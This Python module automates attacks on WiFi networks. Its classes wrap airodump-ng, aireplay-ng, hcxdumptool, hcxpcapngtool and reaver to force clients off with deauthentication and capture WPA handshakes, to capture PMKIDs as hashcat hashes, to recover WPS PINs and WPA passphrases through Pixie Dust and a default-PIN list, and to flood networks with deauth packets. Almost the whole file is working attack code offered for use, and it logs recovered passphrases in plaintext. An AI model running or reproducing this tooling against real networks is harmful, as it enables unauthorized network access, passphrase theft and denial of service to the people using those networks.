"""
WiFi Attacks - Handshake, PMKID, WPS, Deauth attacks.

Implements:
- HandshakeAttack: Deauth + capture (WPA/WPA2)
- PMKIDAttack: Client-less PMKID capture (WPA2/WPA3)
- WPSPixieAttack: Pixie Dust offline attack (reaver + pixiewps)
- WPSPinAttack: Common PIN dictionary attack
- DeauthAttack: Targeted/broadcast deauthentication
"""

import asyncio
import json
import os
import re
import structlog
import subprocess
import tempfile
import time
import uuid
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Callable

logger = structlog.get_logger(__name__)


class AttackStatus(Enum):
    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    TIMEOUT = "timeout"
    CANCELLED = "cancelled"


@dataclass
class AttackResult:
    """Result of an attack execution."""
    attack_type: str
    target_bssid: str
    target_essid: Optional[str]
    status: AttackStatus
    started_at: datetime
    finished_at: Optional[datetime] = None
    output_files: List[str] = field(default_factory=list)
    handshake_path: Optional[str] = None
    pmkid_path: Optional[str] = None
    wps_pin: Optional[str] = None
    wps_psk: Optional[str] = None
    error_message: Optional[str] = None
    metadata: Dict[str, Any] = field(default_factory=dict)

    @property
    def duration_seconds(self) -> Optional[float]:
        if self.finished_at:
            return (self.finished_at - self.started_at).total_seconds()
        return None

    def to_dict(self) -> Dict[str, Any]:
        return {
            "attack_type": self.attack_type,
            "target_bssid": self.target_bssid,
            "target_essid": self.target_essid,
            "status": self.status.value,
            "started_at": self.started_at.isoformat(),
            "finished_at": self.finished_at.isoformat() if self.finished_at else None,
            "duration_seconds": self.duration_seconds,
            "output_files": self.output_files,
            "handshake_path": self.handshake_path,
            "pmkid_path": self.pmkid_path,
            "wps_pin": self.wps_pin,
            "wps_psk": self.wps_psk,
            "error_message": self.error_message,
            "metadata": self.metadata,
        }


class BaseAttack(ABC):
    """Abstract base class for WiFi attacks."""

    def __init__(
        self,
        interface: str,
        output_dir: str = "/var/lib/urban-hs/wifi_attacks",
        attack_timeout: int = 60,
    ):
        self.interface = interface
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.attack_timeout = attack_timeout
        self._running = False
        self._cancelled = False

    @abstractmethod
    async def execute(
        self,
        target_bssid: str,
        target_essid: Optional[str] = None,
        channel: int = 1,
        callback: Optional[Callable[[str], None]] = None,
    ) -> AttackResult:
        """Execute the attack against a target."""
        pass

    def _log(self, message: str, **kwargs) -> None:
        logger.info(message, **kwargs)

    def _notify_callback(self, callback: Optional[Callable[[str], None]], message: str) -> None:
        if callback:
            try:
                callback(message)
            except Exception:
                pass


class HandshakeAttack(BaseAttack):
    """
    WPA/WPA2 Handshake Capture Attack.
    
    Uses aireplay-ng to deauthenticate clients and airodump-ng to capture
    the 4-way handshake when they reconnect.
    """

    def __init__(
        self,
        interface: str,
        output_dir: str = "/var/lib/urban-hs/wifi_attacks/handshakes",
        attack_timeout: int = 60,
        deauth_count: int = 10,
    ):
        super().__init__(interface, output_dir, attack_timeout)
        self.deauth_count = deauth_count

    async def execute(
        self,
        target_bssid: str,
        target_essid: Optional[str] = None,
        channel: int = 1,
        callback: Optional[Callable[[str], None]] = None,
    ) -> AttackResult:
        result = AttackResult(
            attack_type="handshake",
            target_bssid=target_bssid,
            target_essid=target_essid,
            status=AttackStatus.RUNNING,
            started_at=datetime.utcnow(),
        )

        self._running = True
        self._cancelled = False

        # Setup output files
        safe_bssid = target_bssid.replace(":", "_")
        timestamp = int(time.time())
        base_name = f"hs_{safe_bssid}_{timestamp}"
        cap_file = self.output_dir / f"{base_name}.cap"
        handshake_file = self.output_dir / f"{base_name}_handshake.cap"

        result.output_files = [str(cap_file)]

        try:
            # Step 1: Start airodump-ng on target channel
            self._log("Starting airodump-ng capture", bssid=target_bssid, channel=channel)
            self._notify_callback(callback, f"Starting capture on channel {channel}")

            airodump_proc = await self._start_airodump(
                bssid=target_bssid,
                channel=channel,
                output_prefix=str(self.output_dir / base_name),
            )

            # Give airodump time to start
            await asyncio.sleep(2)

            # Step 2: Send deauthentication packets
            self._log("Sending deauth packets", count=self.deauth_count)
            self._notify_callback(callback, f"Sending {self.deauth_count} deauth packets")

            deauth_success = await self._send_deauth(target_bssid, target_essid)

            if not deauth_success:
                self._log("Deauth failed", bssid=target_bssid)
                result.status = AttackStatus.FAILED
                result.error_message = "Deauthentication failed"
                return result

            # Step 3: Wait for handshake
            self._log("Waiting for handshake", timeout=self.attack_timeout)
            self._notify_callback(callback, "Waiting for handshake...")

            handshake_found = await self._wait_for_handshake(
                airodump_proc, cap_file, handshake_file, self.attack_timeout
            )

            airodump_proc.terminate()
            await airodump_proc.wait()

            result.finished_at = datetime.utcnow()

            if handshake_found:
                result.status = AttackStatus.SUCCESS
                result.handshake_path = str(handshake_file)
                result.output_files.append(str(handshake_file))
                self._log("Handshake captured successfully", path=handshake_file)
                self._notify_callback(callback, f"Handshake captured! Saved to {handshake_file}")
            else:
                result.status = AttackStatus.TIMEOUT
                result.error_message = "Handshake not captured within timeout"
                self._log("Handshake capture timed out")
                self._notify_callback(callback, "Timeout - no handshake captured")

        except asyncio.CancelledError:
            result.status = AttackStatus.CANCELLED
            result.error_message = "Attack cancelled"
        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error_message = str(e)
            self._log("Attack failed", error=str(e))
        finally:
            self._running = False

        return result

    async def _start_airodump(
        self,
        bssid: str,
        channel: int,
        output_prefix: str,
    ) -> asyncio.subprocess.Process:
        cmd = [
            "airodump-ng",
            "--bssid", bssid,
            "--channel", str(channel),
            "--write", output_prefix,
            "--output-format", "pcap",
            self.interface,
        ]

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        return proc

    async def _send_deauth(self, bssid: str, essid: Optional[str] = None) -> bool:
        """Send deauthentication packets using aireplay-ng."""
        cmd = [
            "aireplay-ng",
            "-0", str(self.deauth_count),  # deauth count
            "-a", bssid,
            self.interface,
        ]

        if essid:
            cmd.extend(["-e", essid])

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)

            if proc.returncode == 0:
                return True
            else:
                self._log("Deauth failed", stderr=stderr.decode())
                return False
        except Exception as e:
            self._log("Deauth error", error=str(e))
            return False

    async def _wait_for_handshake(
        self,
        airodump_proc: asyncio.subprocess.Process,
        cap_file: Path,
        handshake_file: Path,
        timeout: int,
    ) -> bool:
        """Wait for airodump to capture handshake and verify it."""
        start_time = time.time()
        cap_file_str = str(cap_file) + "-01.cap"  # airodump adds -01

        while time.time() - start_time < timeout:
            # Check if cap file exists and has content
            if Path(cap_file_str).exists() and Path(cap_file_str).stat().st_size > 0:
                # Verify handshake with aircrack-ng
                if await self._verify_handshake(cap_file_str):
                    # Copy verified handshake
                    import shutil
                    shutil.copy2(cap_file_str, handshake_file)
                    return True

            await asyncio.sleep(2)

            if not self._running:
                return False

        return False

    async def _verify_handshake(self, cap_file: str) -> bool:
        """Verify if capture file contains valid handshake."""
        try:
            proc = await asyncio.create_subprocess_exec(
                "aircrack-ng", cap_file,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            output = stdout.decode()

            # Check for "1 handshake" or "4 handshake" in output
            return "handshake" in output.lower() and "1" in output
        except Exception:
            return False


class PMKIDAttack(BaseAttack):
    """
    PMKID Attack (Client-less WPA2/WPA3).
    
    Uses hcxdumptool to capture PMKID without requiring a connected client.
    Then converts to hashcat 22000 format using hcxpcapngtool.
    """

    def __init__(
        self,
        interface: str,
        output_dir: str = "/var/lib/urban-hs/wifi_attacks/pmkid",
        attack_timeout: int = 60,
    ):
        super().__init__(interface, output_dir, attack_timeout)

    async def execute(
        self,
        target_bssid: str,
        target_essid: Optional[str] = None,
        channel: int = 1,
        callback: Optional[Callable[[str], None]] = None,
    ) -> AttackResult:
        result = AttackResult(
            attack_type="pmkid",
            target_bssid=target_bssid,
            target_essid=target_essid,
            status=AttackStatus.RUNNING,
            started_at=datetime.utcnow(),
        )

        self._running = True

        safe_bssid = target_bssid.replace(":", "_")
        timestamp = int(time.time())
        base_name = f"pmkid_{target_bssid.replace(':', '_')}_{timestamp}"
        pcap_file = self.output_dir / f"{base_name}.pcapng"
        hash_file = self.output_dir / f"{base_name}.22000"

        result.output_files = [str(pcap_file)]

        try:
            self._log("Starting PMKID capture", bssid=target_bssid, channel=channel)
            self._notify_callback(callback, f"Starting PMKID capture on channel {channel}")

            # Run hcxdumptool
            proc = await self._run_hcxdumptool(
                bssid=target_bssid,
                channel=channel,
                output_file=pcap_file,
                timeout=self.attack_timeout,
            )

            self._log("hcxdumptool process started", pid=proc.pid)
            self._notify_callback(callback, f"PMKID capture started (PID: {proc.pid})")

            # Wait for capture to complete
            try:
                await asyncio.wait_for(proc.wait(), timeout=self.attack_timeout)
            except asyncio.TimeoutError:
                self._log("hcxdumptool timeout, killing process")
                proc.kill()
                await proc.wait()
                # Check if capture file has data even after timeout
                # Don't raise, continue to conversion
                self._log("hcxdumptool timeout, checking capture file anyway")
                # Don't raise, continue to see if we have data
            
            self._log("hcxdumptool process finished", returncode=proc.returncode)
            
            # Read stderr to see any errors
            if proc.stderr:
                stderr_data = await proc.stderr.read()
                if stderr_data:
                    self._log("hcxdumptool stderr", stderr=stderr_data.decode()[:500])

            result.finished_at = datetime.utcnow()
            # Convert to hashcat format
            if pcap_file.exists() and pcap_file.stat().st_size > 0:
                hash_created = await self._convert_to_hashcat(pcap_file, hash_file)
                
                if hash_created and hash_file.exists() and hash_file.stat().st_size > 0:
                    result.status = AttackStatus.SUCCESS
                    result.pmkid_path = str(hash_file)
                    result.output_files.append(str(hash_file))
                    self._log("PMKID captured successfully", path=hash_file)
                    self._notify_callback(callback, f"PMKID captured! Saved to {hash_file}")
                else:
                    result.status = AttackStatus.FAILED
                    result.error_message = "No PMKID found in capture"
                    self._notify_callback(callback, "No PMKID found")
            else:
                result.status = AttackStatus.FAILED
                result.error_message = "Capture file empty or missing"
                self._notify_callback(callback, "Capture failed - empty file")

        except asyncio.CancelledError:
            result.status = AttackStatus.CANCELLED
            result.error_message = "Attack cancelled"
        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error_message = str(e)
            self._log("PMKID attack failed", error=str(e))
        finally:
            self._running = False

        return result

    async def _run_hcxdumptool(
        self,
        bssid: str,
        channel: int,
        output_file: Path,
        timeout: int,
    ) -> asyncio.subprocess.Process:
        cmd = [
            "sudo",
            "hcxdumptool",
            "-i", self.interface,
            "--enable_status=1",
            "--filterlist_ap", bssid,
            "--filtermode", "2",  # Only target BSSID
            "-c", str(channel),
            "-o", str(output_file),
        ]

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        # Monitor output for status
        asyncio.create_task(self._monitor_hcxdumptool(proc))

        return proc

    async def _monitor_hcxdumptool(self, proc: asyncio.subprocess.Process) -> None:
        if proc.stdout:
            while True:
                line = await proc.stdout.readline()
                if not line:
                    break
                line_str = line.decode().strip()
                if "PMKID" in line_str or "EAPOL" in line_str:
                    logger.info("hcxdumptool status", status=line_str)

    async def _convert_to_hashcat(self, pcap_file: Path, hash_file: Path) -> bool:
        """Convert pcapng to hashcat 22000 format using hcxpcapngtool."""
        try:
            proc = await asyncio.create_subprocess_exec(
                "hcxpcapngtool",
                "-o", str(hash_file),
                str(pcap_file),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            if proc.returncode == 0:
                logger.info("hcxpcapngtool conversion successful", hash_file=str(hash_file))
                return True
            else:
                logger.error("hcxpcapngtool failed", stderr=stderr.decode())
                return False
        except Exception as e:
            logger.error("Conversion failed", error=str(e))
            return False


class WPSPixieAttack(BaseAttack):
    """
    WPS Pixie Dust Attack (Offline).
    
    Uses reaver with --pixie-dust flag to perform offline WPS PIN attack.
    Falls back to pixiewps if reaver captures the necessary data.
    """

    def __init__(
        self,
        interface: str,
        output_dir: str = "/var/lib/urban-hs/wifi_attacks/wps_pixie",
        attack_timeout: int = 120,
    ):
        super().__init__(interface, output_dir, attack_timeout)

    async def execute(
        self,
        target_bssid: str,
        target_essid: Optional[str] = None,
        channel: int = 1,
        callback: Optional[Callable[[str], None]] = None,
    ) -> AttackResult:
        result = AttackResult(
            attack_type="wps_pixie",
            target_bssid=target_bssid,
            target_essid=target_essid,
            status=AttackStatus.RUNNING,
            started_at=datetime.utcnow(),
        )

        self._running = True

        safe_bssid = target_bssid.replace(":", "_")
        timestamp = int(time.time())

        try:
            self._log("Starting WPS Pixie Dust attack", bssid=target_bssid, channel=channel)
            self._notify_callback(callback, f"Starting Pixie Dust attack on channel {channel}")

            # Run reaver with pixie-dust
            proc = await asyncio.create_subprocess_exec(
                "reaver",
                "-i", self.interface,
                "-b", target_bssid,
                "-c", str(channel),
                "-K", "1",  # Pixie Dust
                "-vv",
                "-o", str(self.output_dir / f"reaver_{target_bssid.replace(':', '_')}.log"),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            stdout, stderr = await asyncio.wait_for(
                proc.communicate(), 
                timeout=self.attack_timeout
            )

            result.finished_at = datetime.utcnow()

            stdout_str = stdout.decode()
            stderr_str = stderr.decode()

            # Parse output for PIN and PSK
            pin_match = re.search(r'WPS PIN: (\d{8})', stdout_str)
            psk_match = re.search(r'WPA PSK: (.+)', stdout_str)

            if pin_match or psk_match:
                result.status = AttackStatus.SUCCESS
                if pin_match:
                    result.wps_pin = pin_match.group(1)
                    self._log("PIN found", pin=result.wps_pin)
                if psk_match:
                    result.wps_psk = psk_match.group(1)
                    self._log("PSK found", psk=result.wps_psk)
                self._notify_callback(callback, f"Success! PIN: {result.wps_pin}, PSK: {result.wps_psk}")
            else:
                # Check if pixiewps output is in stderr
                if "WPS pin not found" in stdout_str or proc.returncode != 0:
                    result.status = AttackStatus.FAILED
                    result.error_message = "Pixie Dust attack failed - device not vulnerable"
                    self._notify_callback(callback, "Pixie Dust failed - not vulnerable")
                else:
                    result.status = AttackStatus.FAILED
                    result.error_message = "Attack completed but no PIN/PSK found"

        except asyncio.CancelledError:
            result.status = AttackStatus.CANCELLED
            result.error_message = "Attack cancelled"
        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error_message = str(e)
        finally:
            self._running = False

        return result


class WPSPinAttack(BaseAttack):
    """
    WPS PIN Dictionary Attack.
    
    Uses a database of known default PINs per OUI/vendor to attempt
    WPS authentication without brute forcing.
    """

    def __init__(
        self,
        interface: str,
        output_dir: str = "/var/lib/urban-hs/wifi_attacks/wps_pins",
        attack_timeout: int = 180,
        pin_db_path: str = "/etc/urban-hs/wps_pins.json",
    ):
        super().__init__(interface, output_dir, attack_timeout)
        self.pin_db_path = pin_db_path
        self.pin_database = self._load_pin_database()

    def _load_pin_database(self) -> Dict[str, List[str]]:
        """Load PIN database mapping OUI -> PIN list."""
        default_pins = {
            "00:1A:2B": ["12345670", "00000000", "12345678"],  # Example
            "00:26:F2": ["12345670", "00000000"],
            "00:24:E6": ["12345670"],
            "00:1E:58": ["12345670", "12345678"],
            "00:21:29": ["12345670"],
            "00:22:6B": ["12345670", "12345678"],
            "00:23:69": ["12345670"],
            "00:25:9C": ["12345670"],
            "00:26:82": ["12345670"],
            "00:27:22": ["12345670", "12345678"],
            "00:1C:10": ["12345670"],
            "00:1D:7E": ["12345670"],
            "00:1F:33": ["12345670"],
            "00:22:3F": ["12345670"],
            "00:24:D6": ["12345670"],
            "00:26:5B": ["12345670"],
            "20:E5:2A": ["12345670"],
            "28:80:23": ["12345670"],
            "30:46:9A": ["12345670"],
            "34:EF:D3": ["12345670"],
            "3C:7C:3F": ["12345670"],
            "40:5A:9B": ["12345670"],
            "44:94:FC": ["12345670"],
            "48:5B:39": ["12345670"],
            "4C:60:DE": ["12345670"],
            "50:67:AE": ["12345670"],
            "54:BE:F7": ["12345670"],
            "5C:63:BF": ["12345670"],
            "60:02:B4": ["12345670"],
            "64:70:02": ["12345670"],
            "68:7F:74": ["12345670"],
            "6C:72:20": ["12345670"],
            "70:3A:D8": ["12345670"],
            "74:DA:DA": ["12345670"],
            "78:8A:20": ["12345670"],
            "7C:61:93": ["12345670"],
            "80:3F:5D": ["12345670"],
            "84:1B:5E": ["12345670"],
            "88:03:55": ["12345670"],
            "8C:0C:A3": ["12345670"],
            "90:84:0D": ["12345670"],
            "94:0C:98": ["12345670"],
            "98:DE:D0": ["12345670"],
            "9C:20:7B": ["12345670"],
            "A0:04:60": ["12345670"],
            "A4:2B:B0": ["12345670"],
            "A8:15:4D": ["12345670"],
            "AC:22:0B": ["12345670"],
            "B0:48:7A": ["12345670"],
            "B4:07:F9": ["12345670"],
            "B8:27:EB": ["12345670"],
            "BC:5F:F4": ["12345670"],
            "C0:25:06": ["12345670"],
            "C4:6E:1F": ["12345670"],
            "C8:3A:35": ["12345670"],
            "CC:40:D0": ["12345670"],
            "D0:52:A8": ["12345670"],
            "D4:3D:7E": ["12345670"],
            "D8:30:62": ["12345670"],
            "DC:00:69": ["12345670"],
            "E0:3F:49": ["12345670"],
            "E4:3E:D7": ["12345670"],
            "E8:4E:06": ["12345670"],
            "EC:08:6B": ["12345670"],
            "F0:03:8C": ["12345670"],
            "F4:0F:24": ["12345670"],
            "F8:1A:67": ["12345670"],
            "FC:25:3F": ["12345670"],
        }

        try:
            if Path(self.pin_db_path).exists():
                with open(self.pin_db_path) as f:
                    imported = json.load(f)
                    default_pins.update(imported)
        except Exception:
            pass

        return default_pins

    def _get_oui(self, bssid: str) -> str:
        """Extract OUI from BSSID."""
        parts = bssid.split(":")
        if len(parts) >= 3:
            return ":".join(parts[:3]).upper()
        return ""

    async def execute(
        self,
        target_bssid: str,
        target_essid: Optional[str] = None,
        channel: int = 1,
        callback: Optional[Callable[[str], None]] = None,
    ) -> AttackResult:
        result = AttackResult(
            attack_type="wps_pin_dict",
            target_bssid=target_bssid,
            target_essid=target_essid,
            status=AttackStatus.RUNNING,
            started_at=datetime.utcnow(),
        )

        self._running = True

        oui = self._get_oui(target_bssid)
        pins = self.pin_database.get(oui, ["12345670", "00000000", "12345678"])

        try:
            self._log("Starting WPS PIN dictionary attack", bssid=target_bssid, pins=len(pins))
            self._notify_callback(callback, f"Trying {len(pins)} known PINs for OUI {oui}")

            for i, pin in enumerate(pins):
                if not self._running:
                    break

                self._notify_callback(callback, f"Trying PIN {i+1}/{len(pins)}: {pin}")

                success = await self._try_pin(target_bssid, channel, pin)
                
                if success:
                    result.status = AttackStatus.SUCCESS
                    result.wps_pin = pin
                    result.finished_at = datetime.utcnow()
                    self._log("PIN found!", pin=pin)
                    self._notify_callback(callback, f"SUCCESS! PIN: {pin}")
                    
                    # Try to get PSK from the PIN
                    psk = await self._get_psk_from_pin(target_bssid, channel, pin)
                    if psk:
                        result.wps_psk = psk
                    return result

                await asyncio.sleep(1)  # Rate limiting

            result.status = AttackStatus.FAILED
            result.error_message = "No PIN worked from database"
            result.finished_at = datetime.utcnow()

        except asyncio.CancelledError:
            result.status = AttackStatus.CANCELLED
            result.error_message = "Attack cancelled"
        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error_message = str(e)
        finally:
            self._running = False

        return result

    async def _try_pin(self, bssid: str, channel: int, pin: str) -> bool:
        """Try a single PIN using reaver."""
        try:
            proc = await asyncio.create_subprocess_exec(
                "reaver",
                "-i", self.interface,
                "-b", bssid,
                "-c", str(channel),
                "-p", pin,
                "-vv",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
            
            stdout_str = stdout.decode()
            return "WPS PIN" in stdout_str and "Found" in stdout_str
        except Exception:
            return False

    async def _get_psk_from_pin(self, bssid: str, channel: int, pin: str) -> Optional[str]:
        """Get PSK from PIN using reaver."""
        try:
            proc = await asyncio.create_subprocess_exec(
                "reaver",
                "-i", self.interface,
                "-b", bssid,
                "-c", str(channel),
                "-p", pin,
                "-vv",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            stdout_str = stdout.decode()
            
            psk_match = re.search(r'WPA PSK: (.+)', stdout_str)
            return psk_match.group(1) if psk_match else None
        except Exception:
            return None


class DeauthAttack(BaseAttack):
    """
    Deauthentication Attack.
    
    Uses aireplay-ng to send deauthentication packets.
    Can target specific clients (targeted) or broadcast (all clients).
    """

    def __init__(
        self,
        interface: str,
        output_dir: str = "/var/lib/urban-hs/wifi_attacks/deauth",
        attack_timeout: int = 30,
    ):
        super().__init__(interface, output_dir, attack_timeout)

    async def execute(
        self,
        target_bssid: str,
        target_essid: Optional[str] = None,
        channel: int = 1,
        callback: Optional[Callable[[str], None]] = None,
        **kwargs,
    ) -> AttackResult:
        """Execute deauth attack.
        
        Additional kwargs:
            client_mac: Specific client to deauth (None = broadcast)
            count: Number of deauth packets to send
        """
        client_mac = kwargs.get("client_mac")
        count = kwargs.get("count", 10)
        
        result = AttackResult(
            attack_type="deauth",
            target_bssid=target_bssid,
            target_essid=target_essid,
            status=AttackStatus.RUNNING,
            started_at=datetime.utcnow(),
            metadata={
                "client_mac": client_mac,
                "deauth_count": count,
                "targeted": client_mac is not None,
            },
        )

        try:
            self._log("Starting deauth attack", bssid=target_bssid, client=client_mac, count=count)
            self._notify_callback(callback, f"Sending {count} deauth packets to {client_mac or 'broadcast'}")

            cmd = [
                "aireplay-ng",
                "-0", str(count),
                "-a", target_bssid,
            ]

            if client_mac:
                cmd.extend(["-c", client_mac])

            if target_essid:
                cmd.extend(["-e", target_essid])

            cmd.append(self.interface)

            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)

            result.finished_at = datetime.utcnow()
            result.output_files = []

            if proc.returncode == 0:
                result.status = AttackStatus.SUCCESS
                self._notify_callback(callback, f"Deauth sent successfully to {client_mac or 'all clients'}")
            else:
                result.status = AttackStatus.FAILED
                stderr_str = stderr.decode()
                result.error_message = stderr_str
                self._notify_callback(callback, f"Deauth failed: {stderr_str}")

        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error_message = str(e)
        finally:
            self._running = False

        return result